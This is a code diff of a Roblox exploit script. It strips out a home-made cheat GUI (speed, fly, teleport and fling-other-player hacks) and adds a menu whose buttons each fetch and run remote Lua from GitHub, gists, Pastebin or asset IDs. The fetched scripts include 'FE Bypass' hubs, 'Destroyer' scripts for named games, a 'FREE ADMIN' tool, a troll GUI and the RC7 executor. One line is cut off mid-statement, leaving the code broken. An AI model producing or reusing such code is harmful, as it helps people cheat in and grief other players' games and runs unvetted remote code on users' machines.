@@ -1,140 +1,99 @@
--- Create the main GUI screen
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = game:GetService("CoreGui")
+local c00lgui = Window:Creat
 
--- Create the main frame
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 300, 0, 250)
-MainFrame.Position = UDim2.new(0.5, -150, 0.5, -125)
-MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-MainFrame.BorderSizePixel = 2
-MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-MainFrame.Parent = ScreenGui
 
--- Create a title label
-local TitleLabel = Instance.new("TextLabel")
-TitleLabel.Size = UDim2.new(1, 0, 0, 30)
-TitleLabel.Position = UDim2.new(0, 0, 0, 0)
-TitleLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleLabel.Text = "Roblox Exploit GUI"
-TitleLabel.TextSize = 24
-TitleLabel.Font = Enum.Font.SourceSansBold
-TitleLabel.Parent = MainFrame
 
--- Create a speed hack button
-local SpeedButton = Instance.new("TextButton")
-SpeedButton.Size = UDim2.new(0, 200, 0, 50)
-SpeedButton.Position = UDim2.new(0.5, -100, 0.2, 0)
-SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
-SpeedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-SpeedButton.Text = "Speed Hack"
-SpeedButton.TextSize = 20
-SpeedButton.Font = Enum.Font.SourceSansBold
-SpeedButton.Parent = MainFrame
 
--- Function to enable speed hack
-SpeedButton.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-    local humanoid = character:WaitForChild("Humanoid")
-    humanoid.WalkSpeed = 100  -- Set speed to 100
-end)
+eTab("c00lgui", nil) -- Title, Image
+local c00lguiSection = c00lgui:CreateSection("sqgui")
 
--- Create a fly hack button
-local FlyButton = Instance.new("TextButton")
-FlyButton.Size = UDim2.new(0, 200, 0, 50)
-FlyButton.Position = UDim2.new(0.5, -100, 0.35, 0)
-FlyButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
-FlyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-FlyButton.Text = "Fly Hack"
-FlyButton.TextSize = 20
-FlyButton.Font = Enum.Font.SourceSansBold
-FlyButton.Parent = MainFrame
+local Button = c00lgui:CreateButton({
+   Name = "sqgui by team solsq",
+   Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/theawesomari0/c00lgui/66033e8ff67eccc421fb04b3924e42d4adf3d7a2/c00lgui%20v2.2?subid1=20230826-2047-4399-8bd3-612370889e32",true))()
+   end,
+})
 
--- Function to enable fly hack
-FlyButton.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-    local humanoid = character:WaitForChild("Humanoid")
-    local bodyVelocity = Instance.new("BodyVelocity")
-    bodyVelocity.Velocity = Vector3.new(0, 50, 0)
-    bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
-    bodyVelocity.Parent = character.PrimaryPart
+local Button = c00lgui:CreateButton({
+   Name = "Destroyer GUI",
+   Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua",true))()
+   end,
+})
 
-    game:GetService("RunService").RenderStepped:Connect(function()
-        bodyVelocity.Velocity = Vector3.new(0, 50, 0)
-    end)
-end)
+local Button = c00lgui:CreateButton({
+   Name = "c00lgui reborn v0.5",
+   Callback = function()
+        loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
+   end,
+})
 
--- Create a teleport button
-local TeleportButton = Instance.new("TextButton")
-TeleportButton.Size = UDim2.new(0, 200, 0, 50)
-TeleportButton.Position = UDim2.new(0.5, -100, 0.5, 0)
-TeleportButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
-TeleportButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-TeleportButton.Text = "Teleport"
-TeleportButton.TextSize = 20
-TeleportButton.Font = Enum.Font.SourceSansBold
-TeleportButton.Parent = MainFrame
+local feTab = Window:CreateTab("Fe Bypass", nil) -- Title, Image
+local feSection = feTab:CreateSection("Fe Bypass")
 
--- Function to teleport the player
-TeleportButton.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-    local targetPosition = Vector3.new(0, 100, 0)  -- Set your target position here
-    character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
-end)
+local Paragraph = feTab:CreateParagraph({Title = "NOTICE", Content = "Some FE script can doesn't work if they don't work contact me FireServiceScripter#1073 on discord"})
 
--- Create a fling button
-local FlingButton = Instance.new("TextButton")
-FlingButton.Size = UDim2.new(0, 200, 0, 50)
-FlingButton.Position = UDim2.new(0.5, -100, 0.65, 0)
-FlingButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
-FlingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-FlingButton.Text = "Fling Player"
-FlingButton.TextSize = 20
-FlingButton.Font = Enum.Font.SourceSansBold
-FlingButton.Parent = MainFrame
+local Button = feTab:CreateButton({
+   Name = "FE GAMEPASS UI",
+   Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/QtQ4YnVR'))()
+   end,
+})
 
--- Create a dropdown to select the player to fling
-local PlayerDropdown = Instance.new("Dropdown")
-PlayerDropdown.Size = UDim2.new(0, 200, 0, 30)
-PlayerDropdown.Position = UDim2.new(0.5, -100, 0.8, 0)
-PlayerDropdown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-PlayerDropdown.TextColor3 = Color3.fromRGB(0, 0, 0)
-PlayerDropdown.Text = "Select Player"
-PlayerDropdown.TextSize = 18
-PlayerDropdown.Font = Enum.Font.SourceSans
-PlayerDropdown.Parent = MainFrame
+local Button = feTab:CreateButton({
+   Name = "FE Twilight Daycare Destroyer",
+   Callback = function()
+        loadstring(game:HttpGet('https://gist.githubusercontent.com/dark-modz/46b122bee4a227eca1355a56ebff0cd3/raw/1a1eb29f7eb7153a718986afb379d2786c420fab/OPtwilightdaycareGUI'))(' Watermelon ? ')
+   end,
+})
 
--- Populate the dropdown with player names
-for _, player in ipairs(game.Players:GetPlayers()) do
-    if player.Name ~= game.Players.LocalPlayer.Name then
-        local option = Instance.new("TextButton")
-        option.Size = UDim2.new(1, 0, 0, 30)
-        option.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        option.TextColor3 = Color3.fromRGB(0, 0, 0)
-        option.Text = player.Name
-        option.TextSize = 18
-        option.Font = Enum.Font.SourceSans
-        option.Parent = PlayerDropdown
-    end
-end
+local Button = feTab:CreateButton({
+   Name = "FE Build And Survive Destroyer",
+   Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/LgfZbBVy'))()
+   end,
+})
 
--- Function to fling the selected player
-FlingButton.MouseButton1Click:Connect(function()
-    local selectedPlayerName = PlayerDropdown.Text
-    local targetPlayer = game.Players:FindFirstChild(selectedPlayerName)
-    if targetPlayer then
-        local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
-        local bodyVelocity = Instance.new("BodyVelocity")
-        bodyVelocity.Velocity = Vector3.new(0, 500, 0)  -- Set the fling force here
-        bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
-        bodyVelocity.Parent = targetCharacter.PrimaryPart
+local Button = feTab:CreateButton({
+   Name = "FE Bypassing Hub GUI",
+   Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RealMrQuacks/AuratusX/master/Load"))()
+   end,
+})
 
-        game:GetService("RunService").RenderStepped:Connect(function()
-            bodyVelocity.Velocity = Vector3.new(0, 500, 0)
-        end)
-    end
-end)
+local Button = feTab:CreateButton({
+   Name = "FE Tools Drop [FREE ADMIN]",
+   Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/brownfieldd00/Roblox/main/Games/FREE%20ADMIN.lua'))()
+   end,
+})
+
+local Button = feTab:CreateButton({
+   Name = "FE Troll GUI",
+   Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GetYoScript/Aayus/main/Sick"))()
+   end,
+})
+
+local Button = feTab:CreateButton({
+   Name = "FE Btools",
+   Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/WaqDDa8v'))()
+    end,
+    })
+
+local Button = feTab:CreateButton({
+   Name = "FE Hub Script [Best]",
+   Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
+   end,
+})
+
+local Executors = Window:CreateTab("Executors", nil) -- Title, Image
+local ExSection = Executors:CreateSection("RC7")
+
+local Button = Executors:CreateButton({
+   Name = "RC7",
+   Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))()
+   end,
+})
